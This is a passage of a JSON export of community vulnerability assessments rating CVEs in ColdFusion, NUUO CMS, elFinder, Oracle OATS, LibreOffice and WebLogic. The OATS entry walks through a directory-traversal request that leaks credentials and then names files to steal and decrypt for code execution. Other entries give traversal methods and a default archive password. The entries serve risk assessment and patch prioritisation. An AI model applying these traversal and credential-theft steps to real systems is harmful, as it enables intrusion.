      "created": "2019-05-09T17:57:27.82511Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "## Details\n\nDescription/Details copy/pasta from Metasploit [module documentation](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/coldfusion_ckeditor_file_upload.md).\n\nA file upload vulnerability in the CKEditor of Adobe ColdFusion 11 (Update 14 and earlier), ColdFusion 2016 (Update 6 and earlier), and ColdFusion 2018 (July 12 release) allows unauthenticated remote attackers to upload and execute JSP files through the filemanager plugin.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 3,
        "offensive-application": "not sure"
      },
      "tags": []
    },
    {
      "id": "8005e4d3-49f5-4f05-8a2a-1bca7d611405",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "789cfcc3-5972-48e6-a3ee-521d7c07797a",
      "created": "2019-05-09T17:57:28.27953Z",
      "revisionDate": "2020-02-13T17:12:43.852805Z",
      "document": "## Details\n\nThis exploit requires authentication and either the `php-imagick` or `php-gd` extension to be installed. Exploiting this vulnerability with only\nthe `php-gd` extension installed will require more work when crafting the JPEG because the `php-gd` extension compresses the image and strips it of\nits exif metadata. This is still a valuable exploit due to the large user base of the application.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 4
      },
      "tags": []
    },
    {
      "id": "5979b45c-2c62-488a-8583-aefda4f94670",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "66586765-cbbc-44d5-82cb-a124127ebbd7",
      "created": "2019-05-09T17:57:29.069955Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "No known exploitable services in the wild",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 4,
        "urgent-to-patch": 2,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "42ef50e2-cd57-4959-81d7-b8040da62de2",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "9e798bd6-8754-478d-8d09-b4bccfab3cdf",
      "created": "2019-05-09T17:57:29.520784Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "## Details\n\nDetails from [module documentation](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/gather/nuuo_cms_file_download.md) in Metasploit.\n\nThe GETCONFIG verb is used by a CMS client to obtain configuration files and other resources from the CMS server. An example request is below:\n\n```\nGETCONFIG NUCM/1.0\nFileName: <filename>\nFileType: <number>\nUser-Session-No: <session-number>\n```\n\nThe FileType determines the directory where the file will be downloaded from. \"FileType: 0\" will download from the base installation directory (CMS_DIR), while \"FileType: 1\" will download from \"<CMS_DIR>\\Images\\Map\\\". There are other defined FileType integers, but these have not been investigated in detail.\n\nThe vulnerability is in the \"FileName\" parameter, which accepts directory traversal (..\\\\..\\\\) characters. Therefore, this function can be abused to obtain any files off the file system, including:\n\n- CMServer.cfg, a file zipped with the password \"NUCMS2007!\" that contains the usernames and passwords of all the system users (enabling a less privileged user to obtain the administrator's password)\n- ServerConfig.cfg, another file zipped with the password \"NUCMS2007!\" that contains the SQL Server \"sa\" password as well the FTP server username and password\n- Any other sensitive files in the drive where CMS Server is installed.\n\nThis module works in the following way:\n\n- if a SESSION number is present, uses that to login\n- if not, tries to authenticate with USERNAME and PASSWORD\n\nDue to the lack of ZIP encryption support in Metasploit, the module prints a warning indicating that the archive cannot be unzipped in Msf.",
      "score": 0,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2,
        "urgent-to-patch": 3,
        "confidence-in-ratings": 3,
        "offensive-application": "not sure"
      },
      "tags": []
    },
    {
      "id": "140f26d2-18cb-4e2f-a284-efdd9aaf068c",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "b8626ea1-cbb6-42c4-892d-cef37423f3f7",
      "created": "2019-05-09T17:57:30.622989Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "This is not an exploit by itself, but useful primitive that could be used with something else for an info leak.",
      "score": 1,
      "metadata": {
        "exploitability": 1,
        "atacker-utility": 1,
        "urgent-to patch": 2,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "4deb3af5-cc38-421d-84b2-f17c24456939",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "ca9335f6-b89e-4233-b4e4-8e3099aaee8f",
      "created": "2019-05-09T17:57:31.410878Z",
      "revisionDate": "2020-03-20T00:25:04.308697Z",
      "document": "## Details\n\nThe PHP component in the elFinder software allows unauthenticated users to upload and manipulate images.\nWhile performing image manipulation on a JPEG, elFinder passes the file's name unsanitized to a command line utility called `exiftran`.\nBy inserting arbitrary code into the JPEG's file name, the code will get passed to the exiftran utility and be executed.\n\nThis exploit requires that `exiftran` be installed to work. If `exiftran` is not installed, then the software opts to use `jpegtran`,\nwhich removes exploitability. Despite the caveat listed previously, this is still a valuable exploit.",
      "score": 2,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 4,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 4
      },
      "tags": []
    },
    {
      "id": "2cd94d36-faa5-403e-8caa-c74299ee40a0",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "37a85320-ae35-4d19-9118-f2379c9daac5",
      "created": "2019-05-09T17:57:32.811859Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "XSS always requires extra effort in a pentest, it depends on the actual app being targeted, the user behaviors, privileges of users, etc. This will likely need a custom payload to be useful as well, leverage a browser exploit, etc.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "e77b54e1-9402-420f-9c55-ae7b2acc8669",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "1e11c24b-3fb2-4a58-8627-45a7c62a9221",
      "created": "2019-05-09T17:57:33.370473Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "## Background\n\nOracle Application Testing Suite (OATS) is a comprehensive, integrated testing solution for web applications, web services, packaged Oracle applications, and Oracle databases. OATS is part of an application deployed in the WebLogic service on port 8088, which also includes these tools: Administrator, OpenScript, Oracle Load Testing, and Oracle Test Manager.\n\nIn the Load Testing component, a vulnerability was discovered by Steven Seeley ([@mr_me](<https://twitter.com/steventseeley>)) of [Source Incite](<https://srcincite.io/>) in the DownloadServlet class. According to the Source Incite [advisory](<https://srcincite.io/advisories/src-2019-0033/>), the issue results from the lack of proper validation of a user-supplied string before using it to read a file. An attacker can leverage this vulnerability to execute code in the context of SYSTEM. Note that authentication is required.\n\nThis vulnerability is also known as CVE-2019-2557.\n\n## Vulnerable Setup\n\nThe following is the exact setup I used to test and analyze the vulnerability:\n\n* Windows Server 2008 R2 x64 (other Windows systems are also supported)\n  * .Net Framework 3.5 enabled (from add/remove features)\n  * IE ESC (from Server Manager) disabled\n  * 8GB of RAM (at least more than 4GB will be used to run OATS)\n  * Duel-Core processor\n* [oats-win64-full-13.3.0.1.262.zip](https://download.oracle.com/otn/nt/apptesting/13.3.0.1/oats-win64-full-13.3.0.1.262.zip?AuthParam=1556777168_2adf60d3eeef4dd1b101c27e10687ee4) (x86 did not work for me)\n* [Jdk-7u21-windows-x64.exe](https://download.oracle.com/otn/java/jdk/7u21-b11/jdk-7u21-windows-x64.exe?AuthParam=1556774666_2bb4d38d69aa5fca7e877b62030680a1)\n* [OracleXE112_Win64.zip](https://download.oracle.com/otn/nt/oracle11g/xe/OracleXE112_Win64.zip?AuthParam=1556742235_240fcb1f3d65a474b8bc52709006e3d4) (Newer version 18c did not work well for me)\n* [Firefox](https://download-installer.cdn.mozilla.net/pub/firefox/releases/66.0.3/win64/en-US/Firefox%20Setup%2066.0.3.exe) (I had to install this because IE on Win2k8 is completely outdated)\n* Adobe Flash installed (IE ESC needs to be disabled in order to install this)\n\nFor installation instructions, please refer to the [Oracle Application Testing Suite Installation Guide](<https://docs.oracle.com/cd/E75776_01/doc.1250/e55188/toc.htm>).\n\n## Vulnerability Analysis\n\n### Post Authentication\n\nInitially, one thing that stands out a lot from the description of the advisory is that the vulnerability requires authentication. Although there are two built-in accounts for OATS (default and administrator), their passwords are manaully configured during installation, which makes the attack a bit harder to suceeed. This means that a good password policy could actually prevent CVE-2019-2557, and probably other similiar post-auth attacks.\n\n### Finding DownloadServlet\n\nAlthough public information is very limited regarding the vulnerability, the advisory from Source Incite actually has enough technical details allowing us to investigate. One of those important clues is the fact the vulnerability comes from **DownloadServlet**, so this is the first thing we're looking for in the file system.\n\nA common approach to find something in the file system is either by using the `grep` or `find` command. Windows doesn't have these commands, so [CygWin](<https://www.cygwin.com/>) was installed in my setup to help with debugging.\n\nUsing the `find` command from CygWin, I was able to locate DownloadServlet quickly:\n\n```\nAdministrator@WIN-RJT50G3P0QS /cygdrive/c/OracleATS\n$ find . -name *DownloadServlet*\n./oats/servers/AdminServer/tmp/_WL_user/oats_ee/1ryhnd/war/oracle/oats/olt/web/DownloadServlet.class\n```\n\nHaving that class file, we can easily decompile it with jd-gui (a Java decompiler), and get the source code. The `doGet` function is particularly interesting for us:\n\n```java\npublic void doGet(HttpServletRequest request, HttpServletResponse response)\n  throws ServletException, IOException\n  {\n    User user = (User)request.getSession().getAttribute(\"CurrentUser\");\n    if (user == null) {\n      throw new ServletException(\"Unauthorized session.\");\n    }\n    String type = request.getParameter(\"type\");\n\n    byte[] content = null;\n    String contentMimeType = null;\n    String contentDisposition = null;\n    if (type.equalsIgnoreCase(\"vulog\"))\n    {\n      long id = Long.parseLong(request.getParameter(\"id\"));\n      Vulog log = this.vuLogService.getLog(id);\n      if (log != null)\n      {\n        content = log.getLogcontent();\n        contentMimeType = log.getContentmimetype();\n        if ((content != null) && (contentMimeType != null))\n        {\n          if (contentMimeType.equalsIgnoreCase(\"text/html\")) {\n            content = HtmlModifier.massageRenderedData(content, \"UTF8\");\n          }\n          if (!contentMimeType.contains(\"charset\")) {\n            contentMimeType = contentMimeType + \"; charset=utf-8\";\n          }\n        }\n      }\n    }\n    else if (type.equalsIgnoreCase(\"template\"))\n    {\n      String name = request.getParameter(\"name\");\n      String session = request.getParameter(\"session\");\n      String s = request.getParameter(\"think\");\n      boolean useThinkTimes = false;\n      if (s != null) {\n        useThinkTimes = Boolean.parseBoolean(s);\n      }\n      try\n      {\n        if ((name != null) && (!name.isEmpty()))\n        {\n          String template = this.reportQueriesManager.getTemplate(name);\n          if ((template != null) && (session != null))\n          {\n            content = processTemplate(name, template, session, useThinkTimes, request.getLocale());\n            contentMimeType = determineContentType(name);\n\n            contentDisposition = !contentMimeType.startsWith(\"text\") ? \"attachment; filename=\" + name : null;\n          }\n        }\n      }\n      catch (SettingsException e)\n      {\n        e.printStackTrace();\n      }\n    }\n    if ((content == null) || (contentMimeType == null))\n    {\n      content = \"No content to display.\".getBytes(\"UTF8\");\n      contentMimeType = \"text/plain; charset=utf-8\";\n    }\n    response.setContentType(contentMimeType);\n    response.setContentLength(content.length);\n    if (contentDisposition != null) {\n      response.addHeader(\"Content-Disposition\", contentDisposition);\n    }\n    OutputStream os = response.getOutputStream();\n    os.write(content);\n    os.flush();\n  }\n```\n\n### Clues to Triggering DownloadServlet\n\nAt this point, the DownloadServerlet class is found, and we need to figure out what is using that, and trace our way back to where user inputs could occur. Since this is a Java web application, there should be a file that provides some kind of mappning information. Looking around, I found:\n\n```\nC:\\OracleATS\\oats\\servers\\AdminServer\\tmp\\_WL_user\\oats_ee\\1ryhnd\\war\\WEB-INF\\web.xml\n```\n\n Which tells us our DownloadServlet class is mapped to `/download`:\n\n```xml\n<servlet>\n<description></description>\n<display-name>Download Servlet</display-name>\n<servlet-name>file-download</servlet-name>\n<servlet-class>oracle.oats.olt.web.DownloadServlet</servlet-class>\n<run-as>\n<role-name>oats</role-name>\n</run-as>\n</servlet>\n<servlet-mapping>\n<servlet-name>file-download</servlet-name>\n<url-pattern>/download</url-pattern>\n</servlet-mapping>\n```\n\nNow that I know in order to trigger DownloadServlet, I need to go to the `download` path. But we also need to know how this resource is used by the application normally, so we need an example. Grepping for the `download` string and the keyword `template`, I found:\n\n```\nAdministrator@WIN-RJT50G3P0QS /cygdrive/c/OracleATS/oats/servers/AdminServer/tmp/_WL_user/oats_ee\n$ grep -iR \"/download\" * |grep -i template\nBinary file 1ryhnd/jsp_servlet/_pages/_session/__customtemplate_jsff.class matches\n1ryhnd/war/pages/session/customTemplate.jsff:                   source=\"/download?type=template&amp;session=#{reportBean.session}&amp;name=#{queryManagerBean.selectedTemplate}\">\n```\n\nThis seems to tell us at least two things. One is how a normal request should look like; the parameters used here confirm the Java code we are looking at. The second is that it appears the `download` resource is used by something related to custom templates, and the name is parameter is something selectable.\n\nNote that iIn the DownloadServlet code, the `name` parameter is passed to a `getTemplate` function:\n\n```java\nString template = this.reportQueriesManager.getTemplate(name);\n```\n\nThe next thing we want to do is how to get to custom templates from the user's perspective. It looks like in the Load Testing interface, there is a Reports tab, and in there, we can see a \"Custom Reports\" tab on the left. On this page, you can choose what template to view. If you use the Developers tool to inspect the network traffic for viewing a template, you can see this URL being requested:\n\n```\nhttp://localhost:8088/olt/download?type=template&session=LoadTest500VU_Build1&name=SampleTemplate.htm\n```\n\nAnd that is the HTTP request we should be sending to trigger DownloadServlet.\n\n### Verifying the Trigger by Remote Debugging\n\nUp until this point, all our analysis were based on source code review. However, sometimes mistakes can happen by reviewing code, so we need another way to be sure that we are on the right track. Generally speaking, I would either try adding a breakpoint somehow, or print something in log or on screen if I have control over the source code. Since we have compiled code, we can't really do the second, so we need a way to add a breakpoint.\n\nGoogling around, I found a way to remote-debug WebLogic, and turns out it's quite simple according to Oracle's documentation titled [Remote Debugging an EJB on WebLogic Server](<https://www.oracle.com/technetwork/developer-tools/jdev/remotedebugwls-086628.html>). The write-up is rather long for what we need, but basically, you want to open this file:\n\n```\nC:\\OracleATS\\oats\\bin\\startWebLogic.cmd\n```\n\nAnd add this line as the first java options:\n\n```\nset JAVA_OPTIONS=-Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,address=4000,server=y,suspend=n\n```\n\nNext, go to Control Panel -> Services to stop Oracle ATS Server (this is the WebLogic service). After that, open a command prompt, and run the startWebLogic.cmd script. It will probably take a few minutes to get going, but you will see two ports:\n\n* Port 4000 : The port you need for remote debugging.\n* Port 8088: The port for OATS.\n\nUsing IntelliJ (a popular JAVA IDE), we can use it to remotely debug WebLogic. First, make sure to connect to port 4000 to the target Windows machine, and then add a breakpoint for:\n\n```\noracle.oats.olt.web.DownloadServlet.doGet\n```\n\nNote:\n\n* `oracle.oats.olt.web` is the package name.\n* `DownloadServlet` is the class name.\n* `doGet` is the method name.\n\nThe breakpoint should trigger by selecting a custom template in Oracle Load Testing, and then give us a callstack that shoud look similar to this:\n\n```\ndoGet:59, DownloadServlet (oracle.oats.olt.web)\nservice:731, HttpServlet (javax.servlet.http)\nservice:844, HttpServlet (javax.servlet.http)\nrun:280, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)\nrun:254, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)\ndoAs:321, AuthenticatedSubject (weblogic.security.acl.internal)\nrunAs:120, SecurityManager (weblogic.security.service)\nrun:57, WlsSubjectHandle (weblogic.servlet.provider)\ninvokeServlet:134, StubSecurityHelper (weblogic.servlet.internal)\nexecute:346, ServletStubImpl (weblogic.servlet.internal)\ndoFilter:25, TailFilter (weblogic.servlet.internal)\ndoFilter:79, FilterChainImpl (weblogic.servlet.internal)\nrun:137, JpsAbsFilter$1 (oracle.security.jps.ee.http)\ndoPrivileged:-1, AccessController (java.security)\ndoAsPrivileged:315, JpsSubject (oracle.security.jps.util)\nrunJaasMode:460, JpsPlatformUtil (oracle.security.jps.ee.util)\nrunJaasMode:120, JpsAbsFilter (oracle.security.jps.ee.http)\ndoFilter:217, JpsAbsFilter (oracle.security.jps.ee.http)\ndoFilter:81, JpsFilter (oracle.security.jps.ee.http)\ndoFilter:79, FilterChainImpl (weblogic.servlet.internal)\ndoFilter:220, DMSServletFilter (oracle.dms.servlet)\ndoFilter:79, FilterChainImpl (weblogic.servlet.internal)\ndoFilter:27, RequestEventsFilter (weblogic.servlet.internal)\ndoFilter:79, FilterChainImpl (weblogic.servlet.internal)\nwrapRun:3436, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)\nrun:3402, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)\ndoAs:321, AuthenticatedSubject (weblogic.security.acl.internal)\nrunAs:120, SecurityManager (weblogic.security.service)\nrun:57, WlsSubjectHandle (weblogic.servlet.provider)\ndoSecuredExecute:2285, WebAppServletContext (weblogic.servlet.internal)\nsecuredExecute:2201, WebAppServletContext (weblogic.servlet.internal)\nexecute:2179, WebAppServletContext (weblogic.servlet.internal)\nrun:1572, ServletRequestImpl (weblogic.servlet.internal)\nrun:255, ContainerSupportProviderImpl$WlsRequestExecutor (weblogic.servlet.provider)\nexecute:311, ExecuteThread (weblogic.work)\nrun:263, ExecuteThread (weblogic.work)\n```\n\nWhen the breakpoint is hit, another thing I did was running Process Monitor (a tool in SysInternals) to see the exact file path being accessed. By setting a filter for path `SampleTemplate.htm`, which is what comes with the default installation, this path reveals:\n\n```\nC:\\OracleATS\\config\\Report Templates\\SampleTemplate.htm\n```\n\nSince we have control of the filename (because it comes from the `name` parameter in the GET request), that means the directory traversal starts off in the `Reports Templates` directory.\n\n### Modifying the HTTP Request\n\nThe next thing we want to verify is actually modify the HTTP request and attempt the directory traversal, and we do this with Burp Suite:\n\n```\nGET /olt/download?type=template&session=LoadTest500VU_Build1&name=..\\oats-config.xml HTTP/1.1\nHost: localhost:8088\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://localhost:8088/olt/faces/mainFlow/landing?_afrLoop=115267259422500&_afrWindowMode=0&Adf-Window-Id=w0&_afrPage=1\nConnection: close\nCookie: JSESSIONID=IZt8Xq7BOogZ5mnypzRBEkwK_0mJjSm4FRk0LMo-qYHPdo5NajcQ!1445438826\nUpgrade-Insecure-Requests: 1\n```\n\nBy changing the `name` parameter to an existing file in Oracle (which is located in `C:\\OracleATS\\config`), the web server returns the following HTTP response:\n\n```\nHTTP/1.1 200 OK\nConnection: close\nDate: Fri, 03 May 2019 19:02:24 GMT\nContent-Length: 1024\nContent-Type: text/html; charset=utf-8\nX-ORACLE-DMS-ECID: 3ed7b897-c0f1-4c19-b882-f7a80a432216-0000035d\n\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE properties SYSTEM \"http://java.sun.com/dtd/properties.dtd\">\n<properties>\n<entry key=\"oracle.oats.cluster.agent.username\">oats-agent</entry>\n<entry key=\"oracle.oats.security.keystore.info\">eYAdfLaDkdBlUmflYhpg+CHGeXc=</entry>\n<entry key=\"oracle.oats.cluster.username\">oats</entry>\n<entry key=\"oracle.oats.cluster.agent.password\">{AES}WNdIPXpoeoZzyDNuJPm0wU4R3YKc1SUR2k5+TbQfzIQ=</entry>\n<entry key=\"oracle.oats.admin.username\">oats</entry>\n<entry key=\"oracle.oats.http.url\">http://localhost:8088</entry>\n<entry key=\"oracle.oats.config.version\">9.1.0</entry>\n<entry key=\"oracle.oats.admin.password\">{AES}NHrwlbPc7Arlb7puj+UlzAAXB/dUEbv3bdwNnee1/sc=</entry>\n<entry key=\"oracle.oats.cluster.password\">{AES}WMTjMmLChdB9CTSrnyJ33113u0ml0juuGZQCWPODJTk=</entry>\n<entry key=\"oracle.oats.admin.url\">t3://localhost:8088</entry>\n<entry key=\"oracle.oats.tmp.dir\">/tmp</entry>\n<entry key=\"oracle.oats.cluster.url\">t3://localhost:8088</entry>\n</properties>\n```\n\nWe got the the username, password, the cluster password, etc. Looks like the attack worked.\n\n### Remote Code Execution\n\nIf a directory traversal vulneraebility can turn into a remote code execution, that probably means there is something on the file system that is worth stealing, which could help us to get code execution.\n\nOne of those examples is Ruby on Rails. Rails applications are extra sensitive to directory traversal attacks, because their encryption keys (secret.yml or credentials.yml.enc with master.key) are in the same directory as the application. An attacker could steal those and create a signed serialized payload, and end up getting remote code execution.\n\nOur attack vector for Oracle Application Testing Suite is similar to that scenario. The catch is that all the credentials in OATS are actually encrypted with AES, so in order to get code execution, we need to find a way to decrypt that. To do this, I found this reference: [Decrypting WebLogic Passwords](<https://blog.netspi.com/decrypting-weblogic-passwords/>) by Eric Gruber.\n\nBasically, you need to steal two files for the decryption:\n\n* C:\\OracleATS\\oats\\servers\\AdminServer\\security\\SerializedSystemIni.dat\n* C:\\OracleATS\\oats\\servers\\AdminServer\\security\\boot.properties\n\nAfter confirming with mr_me about this, we know that once the credentials are decrypted, we actually have multiple ways to get in. However, it seems in order to decrypt the credentials, Ruby doesn't have the most suitable crypto library for the task, therefore most publicly available scripts rely on Java's Bouncy Castle. Because of that, there isn't a Metasploit exploit module for now, but as an attacker you can steal these files first, use a public script to decrypt, and then move on to one of the following methods to gain remote code execution.\n\n### The Oracle Console\n\nAn administrator console is actually available in the OATS interface, which can be found at:\n\n```\nhttp://[host]:8088/console\n```\n\nThe username/password found in boot.properties can be used to log into the console, and then upload a malicious WAR to get remote code exectuion.\n\n### The Oracle Database\n\nAnother thing we could steal is the olt-database-config.xml, which gives you access to the Oracle database on port 1521.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "1cf2c127-4d07-4faa-b8c5-cc6621d0d0cd",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "1ebf23ff-8de1-4c84-82c4-07b828119e86",
      "created": "2019-05-09T17:57:34.998654Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "## Details\n\nThe /admin/managetracing/search/search endpoint in MailCleaner Community Edition allows an authenticated user to inject operating system commands.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 3,
        "offensive-application": "not sure"
      },
      "tags": []
    },
    {
      "id": "5e6d12a1-aaac-4467-8285-5fc3e03e8973",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "3374fb55-2a44-4607-a9c5-265e7de9b936",
      "created": "2019-05-09T17:57:36.446335Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "Many versions were vulnerable, and the vulnerability was in a well-used API. The exploit took some time to develop due to a need for a deep understanding of Drupal internals (see blog post in references).",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "1f1343c4-1705-4aeb-8df4-0c7a2db938d5",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "d63a8152-ff88-423f-b246-de1cf9dee44e",
      "created": "2019-05-09T17:57:36.8952Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "## Details\n\nLibreOffice offers the ability to create program events that when triggered, will execute a macro. LibreOffice gives the option to develop custom macros or select a macro from a list of scripts included with the installation. The included macros are written in a variety of languages, including Python.\nCreating a mouse over event that will execute a macro upon hovering over a hyperlink will result in XML that looks similar to this:\n\n`<script:event-listener script:language=\"ooo:script\" script:event-name=\"dom:mouseover\" xlink:href=\"vnd.sun.star.script:pythonSamples|TableSample.py$createTable?language=Python&amp;location=share\" xlink:type=\"simple\"/>`\n\nAlex Inf\u00fchr discovered that a directory traversal vulnerability exists in the `xlink:href` attribute, allowing the ability to call functions (with its arguments) of other Python scripts included with the LibreOffice installation. The `tempfilepager()` function in `program/python-core-3.5.5/lib/pydoc.py` was found to both accept function arguments and pass those arguments to `os.system()`, allowing for arbitrary code execution.\n\n```\ndef tempfilepager(text, cmd):\n    \"\"\"Page through text by invoking a program on a temporary file.\"\"\"\n    import tempfile\n    filename = tempfile.mktemp()\n    with open(filename, 'w', errors='backslashreplace') as file:\n        file.write(text)\n    try:\n        os.system(cmd + ' \"' + filename + '\"')\n    finally:\n        os.unlink(filename)\n```\n\n\n\nThe directory traversal vulnerability stems from how the URI in the `xlink:href` attribute is converted to the  actual URI of the Python script on disk. The function that does this conversion is located in `program/pythonscript.py` called `scriptURI2StorageUri()`.\n\n```\ndef scriptURI2StorageUri( self, scriptURI ):\n    try:\n        myUri = self.m_uriRefFac.parse(scriptURI)\n        ret = self.m_baseUri + \"/\" + myUri.getName().replace( \"|\", \"/\" )\n        log.debug( \"converting scriptURI=\"+scriptURI + \" to storageURI=\" + ret )\n        return ret\n    except UnoException as e:\n        log.error( \"error during converting scriptURI=\"+scriptURI + \": \" + e.Message)\n        raise RuntimeException( \"pythonscript:scriptURI2StorageUri: \" +e.getMessage(), None )\n    except Exception as e:\n        log.error( \"error during converting scriptURI=\"+scriptURI + \": \" + str(e))\n        raise RuntimeException( \"pythonscript:scriptURI2StorageUri: \" + str(e), None )\n```\n\nThe `scriptURI` variable passed to the function is the attacker-controlled path. In the line `ret = self.m_baseUri + \"/\" + myUri.getName().replace( \"|\", \"/\" )`, the local scripts path gets built. `m_baseUri`, the base installation path, gets concatenated with a `/` and the controllable path (with `vnd.sun.star.script:` removed) after any `|` characters are replaced with `/`.\n\nThe final storage URI `ret` would look like this on a Linux LibreOffice installation:\n\n`file:///opt/libreoffice6.1/share/Scripts/python/../../../../program/python-core-3.5.5/lib/pydoc.py$tempfilepager(ARG1, ARG2)`\n",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "92b09337-721a-4755-9b41-2775e0c17191",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "2a5eec4d-ec55-464a-9e35-a8db50c8d7ba",
      "created": "2019-05-09T17:57:38.40162Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "UAF, probably fixed in next major version.",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 4,
        "urgent-to-patch": 3,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "1b3fbce4-874f-4c2f-b6f2-8b2f55f99451",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "cc64872b-7345-4184-a6c6-edd23b47ec7d",
      "created": "2019-05-09T17:57:39.504043Z",
      "revisionDate": "2020-02-13T17:12:41.437685Z",
      "document": "## Details\n\nOn vulnerable versions of Cisco's Webex client software, any local or domain user can execute commands\nwith SYSTEM-level privileges. The software installs a service called `WebExService`, that once started,\nwill run commands at the SYSTEM level.\n\nThis exploit prompts for an Administrator verification on Windows 10 and requires credentials to exploit, but it\nis still a useful exploit for targets prior to Windows 10.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 4
      },
      "tags": []
    },
    {
      "id": "e8d7b25b-f299-4ea5-882f-c0f8abb26326",
      "editorId": "be56a709-ab70-4e82-8afc-87943f13dfe4",
      "topicId": "9b4e2aec-697d-42f0-9fed-b010fb1f82ed",
      "created": "2019-05-09T17:57:39.956442Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "CVE-2019-2725 (aka CNVD-C 2019-48814) exploits an XML deserialization vulnerability in Oracle WebLogic via the AsyncResponseService component. The exploit provides an unauthenticated attacker with remote arbitrary command execution.\n\nAccording to the vendor, Oracle WebLogic Server v10.3.6.0 and 12.1.3.0 are affected.\n\nIn addition to a public proof-of-concept, a Metasploit module has been published to allow for exploitation of Windows, Linux, and Unix hosts.  It has been successfully tested on v10.3.6.0, and exploitation failed against 12.2.1.2.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "92442ac5-5c92-4ef3-8247-c58e152934c9",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "3c4238ea-8945-40be-9d41-66a957e4c3b4",
      "created": "2019-05-09T17:57:41.028596Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
      "document": "Attacker requires too much control in advance for this to be useful.",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 1,
        "urgent-to-patch": 4,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "cd93475e-4b3b-482e-8c72-5c2acdf45d64",
      "editorId": "38119b46-8f40-4697-9429-e6e856507248",
      "topicId": "09df980f-c82e-4104-8dc0-77722281be1c",
      "created": "2019-05-09T17:57:41.485165Z",
      "revisionDate": "2020-03-15T04:22:22.595044Z",
